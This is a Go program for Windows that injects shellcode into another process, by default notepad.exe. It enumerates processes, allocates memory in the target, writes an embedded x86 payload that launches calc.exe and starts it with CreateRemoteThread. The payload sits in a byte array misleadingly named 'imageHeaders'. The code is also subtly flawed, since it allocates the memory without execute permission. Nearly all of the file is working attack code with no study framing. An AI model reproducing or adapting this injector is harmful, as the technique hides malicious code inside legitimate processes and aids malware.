package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"unsafe"
	"strings"
	"syscall"
)

var (
	kernel32               = windows.NewLazyDLL("kernel32.dll")
	psapi                  = windows.NewLazyDLL("psapi.dll")
	user32                 = windows.NewLazyDLL("user32.dll")
	ntdll                  = windows.NewLazyDLL("ntdll.dll")
	procMessageBoxA        = user32.NewProc("MessageBoxA")
	procNtOpenProcess      = ntdll.NewProc("NtOpenProcess")
	procNtAllocateVirtualMemory = ntdll.NewProc("NtAllocateVirtualMemory")
	procNtWriteVirtualMemory    = ntdll.NewProc("NtWriteVirtualMemory")
	procNtCreateThreadEx   = ntdll.NewProc("NtCreateThreadEx")
	procEnumProcesses      = psapi.NewProc("EnumProcesses")
	procOpenProcess        = kernel32.NewProc("OpenProcess")
	procGetModuleHandleA   = kernel32.NewProc("GetModuleHandleA")
	procEnumProcessModules = psapi.NewProc("EnumProcessModules")
	procGetModuleBaseNameA = psapi.NewProc("GetModuleBaseNameA")
	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
)

var imageHeaders = []byte{
		0x89, 0xe5, 0x83, 0xec, 0x20, 0x31, 0xdb, 0x64, 0x8b, 0x5b, 0x30, 0x8b, 0x5b, 0x0c, 0x8b, 0x5b,
		0x1c, 0x8b, 0x1b, 0x8b, 0x1b, 0x8b, 0x43, 0x08, 0x89, 0x45, 0xfc, 0x8b, 0x58, 0x3c, 0x01, 0xc3,
		0x8b, 0x5b, 0x78, 0x01, 0xc3, 0x8b, 0x7b, 0x20, 0x01, 0xc7, 0x89, 0x7d, 0xf8, 0x8b, 0x4b, 0x24,
		0x01, 0xc1, 0x89, 0x4d, 0xf4, 0x8b, 0x53, 0x1c, 0x01, 0xc2, 0x89, 0x55, 0xf0, 0x8b, 0x53, 0x14,
		0x89, 0x55, 0xec, 0xeb, 0x32, 0x31, 0xc0, 0x8b, 0x55, 0xec, 0x8b, 0x7d, 0xf8, 0x8b, 0x75, 0x18,
		0x31, 0xc9, 0xfc, 0x8b, 0x3c, 0x87, 0x03, 0x7d, 0xfc, 0x66, 0x83, 0xc1, 0x08, 0xf3, 0xa6, 0x74,
		0x05, 0x40, 0x39, 0xd0, 0x72, 0xe4, 0x8b, 0x4d, 0xf4, 0x8b, 0x55, 0xf0, 0x66, 0x8b, 0x04, 0x41,
		0x8b, 0x04, 0x82, 0x03, 0x45, 0xfc, 0xc3, 0xba, 0x78, 0x78, 0x65, 0x63, 0xc1, 0xea, 0x08, 0x52,
		0x68, 0x57, 0x69, 0x6e, 0x45, 0x89, 0x65, 0x18, 0xe8, 0xb8, 0xff, 0xff, 0xff, 0x31, 0xc9, 0x51,
		0x68, 0x2e, 0x65, 0x78, 0x65, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x89, 0xe3, 0x41, 0x51, 0x53, 0xff,
		0xd0, 0x31, 0xc9, 0xb9, 0x01, 0x65, 0x73, 0x73, 0xc1, 0xe9, 0x08, 0x51, 0x68, 0x50, 0x72, 0x6f,
		0x63, 0x68, 0x45, 0x78, 0x69, 0x74, 0x89, 0x65, 0x18, 0xe8, 0x87, 0xff, 0xff, 0xff, 0x31, 0xd2,
		0x52, 0xff, 0xd0,
}

const (
	PROCESS_ALL_ACCESS        = 0x1F0FFF
	MEM_COMMIT                = 0x1000
	MEM_RESERVE               = 0x2000
	PAGE_READWRITE            = 0x04
	PAGE_EXECUTE_READWRITE    = 0x40
	MB_OK                     = 0x0
	MB_ICONEXCLAMATION        = 0x30
)

type CLIENT_ID struct {
	UniqueProcessId  windows.Handle
	UniqueThreadId   windows.Handle
}

type OBJECT_ATTRIBUTES struct {
	Length                  uint32
	RootDirectory           windows.Handle
	ObjectName              *string
	Attributes              uint32
	SecurityDescriptor      uintptr
	SecurityQualityOfService uintptr
}

const (
    PROCESS_QUERY_INFORMATION = 0x400
    PROCESS_VM_READ           = 0x10
    PROCESS_VM_WRITE          = 0x20
	PROCESS_VM_OPERATION      = 0x8
	PROCESS_CREATE_THREAD     = 0x2
)

func openProcess(procId uint32) (windows.Handle, error) {
	ret, _, err := procOpenProcess.Call(
		uintptr(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD),
		0,
		uintptr(procId),
	)
    if ret == 0 {
        return 0, fmt.Errorf("failed to open process, error code: %v", err)
    }
    return windows.Handle(ret), nil
}


func getProcessId(targetProcName string) (uint32, error) {
	var procIds [1024]uint32
	var bytesNeeded uint32
	ret, _, err := procEnumProcesses.Call(
		uintptr(unsafe.Pointer(&procIds[0])),
		uintptr(len(procIds)*4),
		uintptr(unsafe.Pointer(&bytesNeeded)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("EnumProcesses failed: %v", err)
	}

	numPids := bytesNeeded / 4
	fmt.Printf("Number of processes found: %d\n", numPids)

	for i := uint32(0); i < numPids; i++ {
		procId := procIds[i]
		hProc, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, procId)
		if err != nil {
			continue
		}
		defer syscall.CloseHandle(hProc)

		var hModule windows.Handle
		var neededSize uint32
		ret, _, err := procEnumProcessModules.Call(uintptr(hProc), uintptr(unsafe.Pointer(&hModule)), uintptr(unsafe.Sizeof(hModule)), uintptr(unsafe.Pointer(&neededSize)))
		if ret == 0 {
			continue
		}

		var processName [windows.MAX_PATH]byte
		ret, _, err = procGetModuleBaseNameA.Call(
			uintptr(hProc),
			uintptr(hModule),
			uintptr(unsafe.Pointer(&processName[0])),
			uintptr(len(processName)),
		)
		if ret == 0 {
			continue
		}

		fmt.Printf("Found process: %s (ID: %d)\n", string(processName[:]), procId)

		if strings.EqualFold(string(processName[:]), targetProcName) {
			return procId, nil
		}
	}
	return 0, fmt.Errorf("process not found")
}

func allocateMemoryRemote(targetProcess windows.Handle, size uint32) uintptr {
    addr, _, err := procVirtualAllocEx.Call(
        uintptr(targetProcess),
        0,  
        uintptr(size),
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE,
    )
    if addr == 0 {
        fmt.Printf("Failed to allocate memory in remote process. Error code: %v\n", err)
        return 0
    }
    return addr
}

func writeImageToRemote(targetProcess windows.Handle, localImage uintptr, remoteImage uintptr, size uint32) {
	var bytesWritten uint32
	ret, _, err := procNtWriteVirtualMemory.Call(
		uintptr(targetProcess),
		remoteImage,
		localImage,
		uintptr(size),  
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret != 0 {
		fmt.Println("Failed to write image to remote process memory:", err)
	} else {
		fmt.Printf("Wrote %d bytes to remote process memory.\n", bytesWritten)
	}
}

func startInjectedThread(targetProcess windows.Handle, remoteImage uintptr) {
	ret, _, err := procCreateRemoteThread.Call(
		uintptr(targetProcess),  
		0,                       
		0,                       
		remoteImage,             
		0,                       
		0,                       
		0,                       
	)
	if ret == 0 {
		fmt.Println("Failed to create remote thread:", err)
	} else {
		fmt.Println("Remote thread created successfully.")
	}
	if targetProcess == 0 {
		fmt.Println("Invalid process handle.")
		return
	}
}

func main() {
	var procId uint32
	fmt.Print("Enter the process ID (or press Enter to use automatic search): ")
	_, err := fmt.Scanf("%d", &procId)
	if err != nil {
		procName := "notepad.exe" 
		procId, err = getProcessId(procName)
		if err != nil {
			fmt.Println("Error finding process:", err)
			return
		}
	}

	targetProcess, err := openProcess(procId)
	if err != nil {
		fmt.Println("Error opening process:", err)
		return
	}

	size := uint32(256) 
	remoteMem := allocateMemoryRemote(targetProcess, size)
	if remoteMem == 0 {
		fmt.Println("Error allocating memory in remote process")
		return
	}

	writeImageToRemote(targetProcess, uintptr(unsafe.Pointer(&imageHeaders[0])), remoteMem, uint32(len(imageHeaders)))

	startInjectedThread(targetProcess, remoteMem)

	fmt.Println("Injection complete. Press Ctrl+C to exit.")
	for {
	}
}